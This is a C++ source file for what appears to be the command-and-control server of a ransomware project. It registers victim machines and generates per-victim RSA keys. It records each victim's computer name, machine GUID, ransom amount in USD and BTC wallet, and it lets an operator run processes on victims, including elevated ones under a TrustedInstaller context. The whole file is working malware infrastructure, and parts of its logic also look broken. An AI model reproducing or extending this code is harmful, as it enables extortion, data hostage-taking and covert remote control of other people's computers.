#include "ServerInterface.h"
#include "Serialization.h"

#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>

#include <fstream>

/**
 * Create two server instances, one to represent TCP and another to represent UDP.
 * 
 * \param UDPPort - the port to listen for UDP messages on
 * \param TCPPort - the port to make a TCP server on
 */
ServerInterface::ServerInterface(int UDPPort, int TCPPort) {
	this->m_TCPServerDetails = NewServerInstance(TCP, TCPPort);
	this->m_UDPServerDetails = NewServerInstance(UDP, UDPPort);
}

/**
 * Check if a server is running if so, shut it down.
 * Afterwords, clean up WSA.
 */
ServerInterface::~ServerInterface() {
	if ( IsServerRunning(this->m_TCPServerDetails) )
		ShutdownServer(TRUE);

	CleanWSA();
}

/**
 * Generate a private and public RSA key using OpenSSL.
 * 
 * \return An RSAKeys struct with all fields filled out.
 * Contains string and BIO* versions of each key.
 */
RSAKeys ServerInterface::GenerateRSAPair() {
	EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, nullptr);
	if ( ctx == NULL )
		return {};

	if ( EVP_PKEY_keygen_init(ctx) <= 0 )
		return {};

	if ( EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 1024) <= 0 )
		return {};

	EVP_PKEY* key = nullptr;
	if ( EVP_PKEY_keygen(ctx, &key) <= 0 ) {
		EVP_PKEY_CTX_free(ctx);
		return {};
	}

	BIO* priv = BIO_new(BIO_s_mem());
	BIO* pub  = BIO_new(BIO_s_mem());

	if ( PEM_write_bio_PrivateKey(priv, key, nullptr, nullptr, 0, nullptr, nullptr) <= 0 ) {
		EVP_PKEY_CTX_free(ctx);
		BIO_free(priv);
		BIO_free(pub);
		EVP_PKEY_free(key);
		return {};
	}

	if ( PEM_write_bio_PUBKEY(pub, key) <= 0 ) { 
		EVP_PKEY_CTX_free(ctx);
		BIO_free(priv);
		BIO_free(pub);
		EVP_PKEY_free(key);
		return {};
	}

	EVP_PKEY_CTX_free(ctx);
	EVP_PKEY_free(key);

	RSAKeys keys;
	keys.bioPublicKey = pub;
	keys.bioPrivateKey = priv;
	keys.strPublicKey = Serialization::ConvertBIOToString(pub);
	keys.strPrivateKey = Serialization::ConvertBIOToString(priv);

	return keys;
}

/**
 * Receive messages on UDP socket. 
 * Interperet them as 'ClientRequest' structs. 
 * Afterwards, perform the action requested. 
 */
void ServerInterface::ListenForUDPMessages() {

	// UDP requests are not encrypted.
	sockaddr_in recvAddr;
	int addrSize = sizeof(recvAddr);

	// receive while udp server is alive
	while ( this->m_UDPServerDetails.alive == TRUE ) {
		ClientRequest req = {};
		sockaddr_in   incomingAddr;
		BOOL		  received = NetCommon::ReceiveData(req, this->m_UDPServerDetails.sfd, UDP, incomingAddr);
		if ( !received )
			continue;
		std::cout << "Received a message on the UDP socket!\n";

		PerformRequest(req, this->m_UDPServerDetails, -1, incomingAddr);
	}
}

/**
 * Send a message to all clients in the servers client list.
 * 
 * \param req - a 'ServerCommand' struct to tell the clients which action to perform
 * \return TRUE or FALSE depending on if the last message sent failed.
 */
BOOL ServerInterface::TCPSendMessageToAllClients(ServerCommand& req) {
	BOOL success = FALSE;

	m_ClientListMutex.lock();

	for ( auto& [ id, client ] : this->m_ClientList )
		success = TCPSendMessageToClient(id, req);

	m_ClientListMutex.unlock();

	return success;
}

/**
 * Read the server state file as json and return the file contents.
 * 
 * \return File contents as a JSON type
 */
JSON ServerInterface::ReadServerStateFile() {
	JSON parsed;
	if ( std::filesystem::file_size(ReadConfig().serverStateFullPath) == 0 ) {
		return parsed;
	}
	
	std::ifstream input(ReadConfig().serverStateFullPath);

	input >> parsed;  // Attempt to parse the JSON
	return parsed;
}

/**
 * Get a clients save file from the server state file by using the clients Machine GUID.
 * Note: the client of 'cuid' must have it's MachineGUID field filled out.
 * 
 * \param cuid - required to lookup existing data for the client
 * \return Client* - the client pointer object with all fields filled out
 *  with the most update information from the server state file
 */
Client* ServerInterface::GetClientSaveFile(long cuid) {
	Client* client = GetClientPtr(cuid);
	std::string machineGUID = client->GetMachineGUID();

	if ( !IsClientInSaveFile(machineGUID) )
		return {};

	JSON data = ReadServerStateFile();
	if ( !data.contains("client_list") )
		return nullptr;

	JSON JSONClientList = data["client_list"];
	JSON JSONClientInfo = JSONClientList[machineGUID];
	client->SetDesktopName(JSONClientInfo["computer_name"]);
	client->RansomAmountUSD = JSONClientInfo["ransom_payment_usd"];
	client->SetMachineGUID(JSONClientInfo["machine_guid"]); 

	RSAKeys secrets;
	macaron::Base64::Decode(JSONClientInfo["b64_rsa_public_key"], secrets.strPublicKey);
	macaron::Base64::Decode(JSONClientInfo["b64_rsa_private_key"], secrets.strPrivateKey);
	secrets.strPrivateKey = client->GetSecrets().strPrivateKey;
	secrets.strPrivateKey = client->GetSecrets().strPublicKey;
	client->SetEncryptionKeys(secrets);
	client->UniqueBTCWalletAddress = JSONClientInfo["unique_btc_wallet"];

	return client;
}

/**
 * Save information about this->m_TCPServerDetails to a file stored on the servers machine as JSON.
 * 
 * \return TRUE if no errors occured.
 */
BOOL ServerInterface::SaveServerState() {
	m_ClientListMutex.lock();

	JSON data = ReadServerStateFile();
	data["server_info"] = {
		{"connections",		   this->m_ClientList.size()},
		{"max_connections",    ReadConfig().maxConnections},
		{"server_state_path",  ReadConfig().serverStateFullPath},
		{"server_config_path", ReadConfig().serverConfigFilePath},
		{"udp_port",           ReadConfig().UDPPort},
		{"tcp_port",           ReadConfig().TCPPort},
		{"tcp_dns",            ReadConfig().domainName},
	};
	
	for ( auto& iter : this->m_ClientList ) {
		Client client = iter.second;
		data["client_list"][client.GetMachineGUID()] = {
			{ "computer_name", client.GetDesktopName()},
			{ "machine_guid", client.GetMachineGUID()},
			{ "client_id", client.ClientUID },
			{ "unique_btc_wallet", client.UniqueBTCWalletAddress },
			{ "ransom_payment_usd", client.RansomAmountUSD },
			{ "b64_rsa_public_key", macaron::Base64::Encode(client.GetSecrets().strPublicKey) },
			{ "b64_rsa_private_key", macaron::Base64::Encode(client.GetSecrets().strPrivateKey) },
		};
	}

	std::ofstream outFile(ReadConfig().serverStateFullPath);
	outFile << std::setw(4) << data << std::endl;
	outFile.close();

	m_ClientListMutex.unlock();
	return TRUE;
}

void ServerInterface::ShutdownServer(BOOL confirm) {
	if ( !confirm ) return;

	this->m_TCPServerDetails.alive = FALSE;
	ShutdownSocket(this->m_TCPServerDetails.sfd, 2); // shutdown server socket for both read and write
	CloseSocket(this->m_TCPServerDetails.sfd);
	this->m_TCPServerDetails = {}; // set server details to new blank server structure
}

/**
 * Perform a request based on the action.
 * 
 * \param req - a 'ClientRequest' sent from a client over a socket
 * \param on - The server to perform the request on
 * \param cuid - The cuid of the sender of the request
 * \param incoming - Optional sockaddr_in to send a reply back if 'on' is a UDP server
 * \return 
 */
BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, sockaddr_in incoming) {
	if ( !req.valid ) 
		return FALSE;
	
	BOOL    success = FALSE;
	BOOL    onTCP   = ( on.type == SOCK_STREAM ); // TRUE = performing on tcp server, FALSE = performing on udp
	Client* TCPClient = nullptr;

	if ( onTCP ) 
		TCPClient = GetClientPtr(cuid);

	std::cout << "Performing action : " << req.action << std::endl;

	switch ( req.action )
	{
	case ClientRequest::kGetRequestEncryptionKeyPrivate: 
	{
		if ( !onTCP )
			break;

		// send private key to client base64 encoded
		std::string privKey = TCPClient->GetRequestSecrets().strPrivateKey;
		std::string base64 = macaron::Base64::Encode(privKey);  
		BYTESTRING buffer = Serialization::SerializeString(base64);
		
		success = NetCommon::TransmitData(buffer, TCPClient->GetSocket(TCP), TCP);
		std::cout << "Sent request private key\n";
		break;
	}
	case ClientRequest::kGetRequestEncryptionKeyPublic:
	{
		if ( !onTCP )
			break;

		// send public key to client base64 encoded
		std::string pub = TCPClient->GetRequestSecrets().strPublicKey;
		std::string base64 = macaron::Base64::Encode(pub);
		BYTESTRING buffer = Serialization::SerializeString(base64);

		success = NetCommon::TransmitData(buffer, TCPClient->GetSocket(TCP), TCP);
		std::cout << "Sent request public key\n";
		break;
	}
	case ClientRequest::kDisconnectClient:
		SaveServerState();

		this->m_ClientListMutex.lock();
		this->m_ClientList.erase(cuid);
		this->m_ClientListMutex.unlock();
		
		TCPClient->Disconnect();
		TCPClient = nullptr;
		success = TRUE;
		break;
	// connect client to tcp server on udp request
	case ClientRequest::kConnectClient: 
	{
		if ( onTCP ) // already connected
			break;

		Client UDPClient( req.tcp, req.udp, incoming );

		// client wants to connect so respond with tcp server details
		hostent* host = GetHostByName(DNS_NAME.c_str());

		// server with ip inserted into addr for the client to connect to
		// allows me to change the dns name to whatever i want, whenever
		Server temp = this->m_TCPServerDetails;
		memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);

		std::cout << "[kConnectClient] : Good address. \n";
		std::cout << "[kConnectClient] : Sending TCP server details. \n";

		UDPMessage response;
		response.isValid = TRUE;
		response.TCPServer = temp;
		if ( UDPSendMessageToClient(UDPClient, response) )
			success = TRUE;

		if ( success )
			std::cout << "[kConnectClient] : Sent TCP details. \n";

		break;
	}
	case ClientMessage::kRequestPrivateEncryptionKey: 
	{
		// tcp only command
		if ( !onTCP ) 
			break;

		//if ( !IsRansomPaid(client) ) {
		//	success = FALSE;
		//	break;
		//}

		ServerCommand reply(RemoteAction::kReturnPrivateRSAKey, {}, "", "", TCPClient->GetSecrets().strPrivateKey);
		success = TCPSendMessageToClient(cuid, reply);

		break;
	}
	case ClientMessage::kRequestPublicEncryptionKey:
		if ( !onTCP )
			break;
		//success = SendTCPClientRSAPublicKey(cuid, Serialization::GetBIOFromString(TCPClient->GetRequestSecrets().strPrivateKey));
		break;
	case ClientMessage::kRequestRansomBTCAddress:
		if ( !onTCP )
			break;
		break;
	case ClientMessage::kValidateRansomPayment:
		if ( !onTCP )
			break;
		break;
	}
}

/**
 * Receive TCP messages from a client and perform requests based on those messages.
 * 
 * \param cuid - the cuid of the client to receive messages from
 */
void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
	Client* client = GetClientPtr(cuid);

	if ( client == nullptr )
		return;

	// initial request to send rsa keys before we can start encrypted communication
	// use tcp server because udp is prone to not sending the keys fully
	{
		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP));
		PerformRequest(receivedData, this->m_TCPServerDetails, cuid);
		receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP));
		PerformRequest(receivedData, this->m_TCPServerDetails, cuid);
	}

	GetClientComputerName(cuid);
	GetClientMachineGUID(cuid);

	if ( IsClientInSaveFile(client->GetMachineGUID()) )
		GetClientSaveFile(client->ClientUID);

	SaveServerState();

	// tcp receive main loop
	std::cout << "[TCP] : Receiving messages from " << cuid << " (" << client->GetMachineGUID() << "/" << client->GetDesktopName() << ")\n";
	do
	{

		// get a client response usually after an action is performed on the remote host
		if ( client->ExpectingResponse ) {
			client->LastClientResponse = client->RecentClientResponse;
			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(client->GetSocket(TCP), TRUE, Serialization::GetBIOFromString(client->GetRequestSecrets().strPrivateKey));
			continue;
		}

		// receive data from client, decrypt it using their rsa key
		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP), TRUE, Serialization::GetBIOFromString(client->GetRequestSecrets().strPrivateKey));

		BOOL performed = PerformRequest(receivedData, this->m_TCPServerDetails, cuid);
	} while ( client->Alive );
}

/**
 * Send the client their uniquely generated RSA public key over TCP.
 * 
 * \param cuid - the cuid of the client who will be sent the RSA key
 * \param pubKey - BIO* of the clients public key
 * \return 
 */
//BOOL ServerInterface::SendTCPClientKey(long cuid, std::string key) {
//	if ( !ClientIsInClientList(cuid) )
//		return FALSE;
//
//	Client* client = GetClientPtr(cuid);
//
//	std::string bio = Serialization::ConvertBIOToString(key); // pub key as a string
//	std::string base64 = macaron::Base64::Encode(bio);  
//	BYTESTRING buffer = Serialization::SerializeString(base64);
//
//	BOOL sent = NetCommon::TransmitData(buffer, client->GetSocket(TCP), TCP);
//
//	return TRUE;
//}

/**
 * Accept incoming client connection requests for the TCP server.
 * 
 */
void ServerInterface::AcceptTCPConnections() {
	if ( this->m_TCPServerDetails.accepting ) // already accepting connections
		return;

	this->m_TCPServerDetails.accepting = TRUE;

	std::cout << "[TCP] : Accepting connections...\n";

	while ( this->m_ClientList.size() <= 200 && this->m_TCPServerDetails.alive == TRUE )
	{
		// accept
		sockaddr_in addr = {};
		int size = sizeof(sockaddr_in);
		
		SOCKET clientSocket = AcceptOnSocket(this->m_TCPServerDetails.sfd, reinterpret_cast<sockaddr*>( &addr ), &size);
		if ( clientSocket == INVALID_SOCKET )
			continue;

		Client  newClient(clientSocket, 0, addr);
		RSAKeys requestKeys = GenerateRSAPair();
		RSAKeys ransomKeys = GenerateRSAPair();
		newClient.SetRequestSecrets(requestKeys);
		newClient.SetRansomSecrets(ransomKeys);
		
		AddToClientList(newClient); // add them to the client list

		// start receiving tcp data from that client for the lifetime of that client
		std::thread receive(&ServerInterface::TCPReceiveMessagesFromClient, this, newClient.ClientUID);
		receive.detach();
	}

	// stopped accepting connections. this function is now done.
	this->m_TCPServerDetails.accepting = FALSE;
}

BOOL ServerInterface::HandleUserInput(unsigned int command, ServerCommand& outputCommand) {
	BOOL performed = FALSE;
	ServerCommand cmdInfo = {};
	cmdInfo.action = static_cast<RemoteAction>(command);

	switch ( command ) {
	case RemoteAction::KOpenElevatedProcess:
		std::cout << "Opening elevated remote process.\n";
		cmdInfo.remoteContext = SecurityContext::TrustedInstaller;
		std::cout << "Enter arguments for command line: " << std::endl;
	case RemoteAction::kOpenRemoteProcess:
		std::cin >> cmdInfo.commandLineArguments;
		cmdInfo.valid = TRUE;
		performed = TRUE;
		break;
	case RemoteAction::kPingClient:
		performed = TRUE;
		break;
	//case RemoteAction::kReturnPrivateRSAKey:
	//case RemoteAction::kReturnPublicRSAKey:
	//case RemoteAction::kSendPublicRSAKey:
	//case RemoteAction::kUseCommandLineInterface:
		//break;
	}

	if ( !performed )
		return FALSE;

	outputCommand = cmdInfo;

	return performed;
}

BOOL ServerInterface::SendCommandsToClients() {
	std::thread send(&ServerInterface::RunUserInputOnClients, this);
	send.detach();
}

void ServerInterface::RunUserInputOnClients() {
	while ( this->m_ClientList.size() <= 0 )
		Sleep(100);

	while ( this->m_TCPServerDetails.alive && m_ClientList.size() > 0 ) {
		// select which client to run command on
		unsigned long clientID  = 0;	
		unsigned int  command   = 0;
		BOOL		  performed = FALSE;
		ServerCommand performingCommand;

		std::cout << "YOU ARE NOW RUNNING COMMANDS ON REMOTE HOSTS...\n";
		std::cout << "Enter 'ClientID' of the remote host to perform commands on (0 for all): ";
		std::cin >> clientID;
		std::cout << "\nPerforming commands on client " << clientID << std::endl;

		// input number corrosponding to remote host command
		std::cout << "Input number corresponding to remote host command: ";
		std::cin >> command;
		std::cout << "Your input: " << command << std::endl;
		performed = HandleUserInput(command, performingCommand);
		std::cout << "Fill out performingCommand\n";

		Client* client = GetClientPtr(clientID);
		if ( !client ) {
			system("cls");
			continue;
		}

		/*	
			1. Serialize the servercommand struct 
			2. Encode the serialized struct with base64
			3. Serialize b64
			4. Encrypt b64 with rsa
		*/

		std::cout << "Client " << client->ClientUID << " key: " << client->GetSecrets().strPrivateKey << std::endl;
		BYTESTRING serialized = Serialization::SerializeStruct<ServerCommand>(performingCommand);
		std::string b64 = macaron::Base64::Encode(Serialization::BytestringToString(serialized));
		BYTESTRING b64bs = Serialization::SerializeString(b64);
		BYTESTRING cipher = LGCrypto::RSAEncrypt(b64bs, Serialization::GetBIOFromString(client->GetRequestSecrets().strPublicKey), FALSE);
		std::cout << "cipher size: " << cipher.size() << " serialized size: " << b64bs.size() << std::endl;

		BOOL success = NetCommon::TransmitData(cipher, client->GetSocket(TCP), TCP);
		if ( success ) {
			std::cout << "Sent the message to client.\n";
			system("pause");
		}
		else {
			std::cout << "There was an error performing the request. Request: " << performingCommand.action << " Client: " << clientID << std::endl;
			system("pause");
		}

		//if ( !success ) {
		//	std::cout << "There was an error performing the request. Request: " << performingCommand.action << " Client: " << clientID << std::endl;
		//	system("pause");
		//}

		system("cls");
	}
}

/**
 * Receive a remote clients Windows Machine GUID over the TCP server.
 * 
 * \param cuid - the cuid of the client whom we are to receive the machine GUID from.
 * \return TRUE if no errors occured; otherwise FALSE
 */
BOOL ServerInterface::GetClientMachineGUID(long cuid) {
	Client* client = GetClientPtr(cuid);

	BYTESTRING machienGUID;
	BOOL received = NetCommon::ReceiveData(machienGUID, client->GetSocket(TCP), TCP);
	if ( !received )
		return FALSE;

	BYTESTRING decrypted = LGCrypto::RSADecrypt(machienGUID, client->GetRequestSecrets().bioPrivateKey, TRUE);
	std::string machineGuid = Serialization::BytestringToString(decrypted);
	client->SetMachineGUID(machineGuid);
	return TRUE;
}

/**
 * Receive a remote clients Windows computer name.
 * 
 * \param cuid - the cuid of the client whom we are to receive their computer name from.
 * \return TRUE if no errors occured; otherwise FALSE
 */
BOOL ServerInterface::GetClientComputerName(long cuid) {
	Client* client = GetClientPtr(cuid);

	BYTESTRING computerNameSerialized;
	BOOL received = NetCommon::ReceiveData(computerNameSerialized, client->GetSocket(TCP), TCP);
	if ( !received )
		return FALSE;

	std::cout << "going to decrypt client machine guid with key " << client->GetSecrets().strPrivateKey << std::endl;

	BYTESTRING decrypted = LGCrypto::RSADecrypt(computerNameSerialized, client->GetRequestSecrets().bioPrivateKey, TRUE);
	std::string computerName = Serialization::BytestringToString(decrypted);
	std::cout << "receiving computer name " << computerName << std::endl;
	client->SetDesktopName(computerName);
	return TRUE;
}

/**
 * Create a 'Server' struct with all fields filled out for a communication protocal.
 * Also create a socket and store it in the 'sfd' field.
 * 
 * \param serverType - the type of server to make, TCP or UDP
 * \param port - the port the server shall run on
 * \return 'Server' structure with all fields filled out and a valid socket based on the server type.
 */
Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {	
	Server server = {};
	
	if ( !NetCommon::WSAInitialized )
		NetCommon::LoadWSAFunctions();

	// create socket for server type
	// update server fields
	if ( serverType == TCP ) {
		server.sfd = CreateSocket(AF_INET, SOCK_STREAM, 0);
		if ( server.sfd == INVALID_SOCKET )
			return server;

		server.type = SOCK_STREAM;
		m_Config.TCPPort = port;
	} else if ( serverType == UDP) {
		server.sfd = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if ( server.sfd == INVALID_SOCKET )
			return server;
		server.type = SOCK_DGRAM;
		m_Config.UDPPort = port;
	}
	
	server.addr.sin_addr.s_addr = INADDR_ANY;
	server.addr.sin_family	    = AF_INET;
	server.addr.sin_port        = HostToNetworkShort(port);
	server.port                 = port;
	server.alive = TRUE;
	server.accepting = FALSE;

	return server;
}

/**
 * Start a server by relying on the details provided in a 'Server' structure.
 * Create a thread afterwards (either AcceptTCPConnections or ListenForUDPMessages) depending on the server type.
 * 
 * \param server - the details of the server to start
 * \return TRUE if the server has started, FALSE if otherwise
 */
BOOL ServerInterface::StartServer(Server& server) {
	std::cout << "Starting server on port " << server.port << "... ";
	if ( server.sfd == INVALID_SOCKET )
		return FALSE;

	// bind
	int status = SOCKET_ERROR;
	status = BindSocket(server.sfd, ( sockaddr* ) &server.addr, sizeof(server.addr));
	if ( status == SOCKET_ERROR )
		return FALSE;

	server.alive = TRUE;

	// listen if TCP server
	if ( server.type == SOCK_STREAM ) {
		status = SocketListen(server.sfd, SOMAXCONN);
		if ( status == SOCKET_ERROR )
			return FALSE;

		this->m_TCPServerDetails = server;

		// start accepting
		std::thread acceptThread(&ServerInterface::AcceptTCPConnections, this);
		acceptThread.detach(); // run accept thread even after this function returns

		this->SendCommandsToClients();
	}
	// otherwise if not tcp server then listen for udp messaages
	else if ( server.type == SOCK_DGRAM ) {
		this->m_UDPServerDetails = server;

		std::thread receiveThread(&ServerInterface::ListenForUDPMessages, this);
		receiveThread.detach();
	}

	std::cout << "Done!" << std::endl;

	return TRUE;
}

/**
 * Send a message to a client over TCP.
 * 
 * \param cuid - the cuid of the client to send a message to
 * \param req - the 'ServerCommand' structure to send over the socket
 * \return TRUE or FALSE depending if the message was sent or not
 */
BOOL ServerInterface::TCPSendMessageToClient(long cuid, ServerCommand& req) {
	Client* c = GetClientPtr(cuid);
	return NetCommon::TransmitData(req, c->GetSocket(TCP), TCP);
}

/**
 * Wait for a response from a client after a ServerCommand was sent.
 * 
 * \param cuid - the cuid of the client to receive a response from
 * \return 'ClientResponse' sent to the server from the client
 */
ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
	Client* client = GetClientPtr(cuid);
	if ( client == nullptr ) return {};

	client->ExpectingResponse = TRUE;

	// wait until new client response
	do {
		Sleep(500); // wait 500 ms
	} 
	while ( client->RecentClientResponse.id != client->LastClientResponse.id );

	client->ExpectingResponse = FALSE;

	return client->RecentClientResponse;
}

/**
 * Send a message to a client over UDP.
 *
 * \param clientInfo - a 'Client' class with crucial details about the client filled out
 * \param message - the 'UDPMessage' structure to send over the socket
 * \return TRUE or FALSE depending if the message was sent or not
 */
BOOL ServerInterface::UDPSendMessageToClient(Client clientInfo, UDPMessage& message) {
	return NetCommon::TransmitData(message, this->m_UDPServerDetails.sfd, UDP, clientInfo.GetAddressInfo());
}

/**
 * Get a pointer to a client from the servers client list.
 * 
 * \param cuid - the cuid of the client to get
 * \return Client* class that represents the client, or nullptr if error.
 */
Client* ServerInterface::GetClientPtr(long cuid) {
	if ( !ClientIsInClientList(cuid) ) return nullptr;
	return &this->m_ClientList.at(cuid);
}

/**
 * Get the servers client list. Lock the ClientListMutex beforehand.
 * 
 * \return this->ClientList
 */
std::unordered_map<long, Client>& ServerInterface::GetClientList() {
	std::lock_guard<std::mutex> lock(m_ClientListMutex);
	return this->m_ClientList;
}

/**
 * Check if a client's machine guid is in the server save file client list.
 * 
 * \param machineGUID - the machine GUID to try and find
 * \return TRUE or FALSE whether or not the machine guid is found in the file
 */
BOOL ServerInterface::IsClientInSaveFile(std::string machineGUID) {
	JSON file = ReadServerStateFile();
	if ( !file.empty() && file.contains("client_list") )
		return file["client_list"].contains(machineGUID);

	return FALSE;
}

/**
 * Ping a client over TCP and receive a response if possible.
 * TODO: make a timeout so that receive doesnt hang
 * 
 * \param cuid - the cuid of the client to ping
 * \return A 'ClientResponse' sent to the server from the pinged client
 */
ClientResponse ServerInterface::PingClient(long cuid) {
	if ( !ClientIsInClientList(cuid) )
		return {};

	Client* client = GetClientPtr(cuid);
	if ( client->GetSocket(TCP) == INVALID_SOCKET ) // socket isnt ready so cant ping.
		return {};

	// send the ping to the client over tcp
	ServerCommand pingCommand;
	pingCommand.action = RemoteAction::kPingClient;
	pingCommand.valid = TRUE;
	
	BOOL sent = TCPSendMessageToClient(cuid, pingCommand);
	if ( !sent )
		return {};

	return WaitForClientResponse(cuid);
}

/**
 * Receive data from a client and interpret it as _Struct.
 * 
 * \param s - the socket to receive data on
 * \param encrypted - whether or not the communication is encrypted
 * \param rsaKey - if communication is encrypted, the rsa key to decrypt the incoming request
 * \return 
 */
template <typename _Struct>
_Struct ServerInterface::ReceiveDataFrom(SOCKET s, BOOL encrypted, BIO* rsaKey)
{
	_Struct outData;
	BOOL received = NetCommon::ReceiveData(outData, s, SocketTypes::TCP, NetCommon::_default, encrypted, rsaKey, TRUE);
	if ( !received )
		return {};

	return outData;
}

/**
 * Check whether or not cuid is in this->ClientList.
 * 
 * \param cuid - the cuid to check if it is in the client list
 * \return TRUE if the cuid is in the client list, otherwise FALSE
 */
BOOL ServerInterface::ClientIsInClientList(long cuid) {
	return GetClientList().contains(cuid);
}

/**
 * Add a client to the servers client list.
 * 
 * \param client - the client to add
 * \return TRUE if the client was added.
 */
BOOL ServerInterface::AddToClientList(Client client) {	
	m_ClientListMutex.lock();	
	this->m_ClientList.insert(std::make_pair(client.ClientUID, client));
	 
	m_ClientListMutex.unlock();
	
	return TRUE;
}